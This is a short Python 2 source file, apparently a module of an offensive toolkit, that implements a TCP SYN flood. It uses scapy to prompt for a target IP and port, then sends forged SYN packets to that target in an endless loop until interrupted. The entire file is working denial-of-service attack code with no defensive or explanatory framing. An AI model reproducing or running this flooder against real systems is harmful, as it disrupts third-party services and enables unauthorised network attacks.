from scapy.all import *
from dos import DoS


class tcp_syn(DoS):

    def __init__(self):
        """ Simple TCP SYN flooder.  Absolutely nothing fancy, and could
        probably use some love.
        """
        super(tcp_syn, self).__init__('TCP SYN')

    def initialize(self):
        while True:
            try:
                ip = raw_input('[+] Enter [ip:port]: ')
                tmp = raw_input('[+] Flood host \'%s\'.  Is this correct? '
                                                                        % ip)
                if 'n' in tmp.lower() or not ':' in ip:
                    return
                break
            except KeyboardInterrupt:
                return
            except:
                pass

        print '[!] Flooding \'%s\'...' % ip
        pkt = IP(dst=ip.split(':')[0])
        pkt /= TCP(sport=15, dport=int(ip.split(':')[1]),
                                                    window=1000, flags='S')
        try:
            send(pkt, loop=1)
        except:
            pass
        print '[+] Quit flood.'
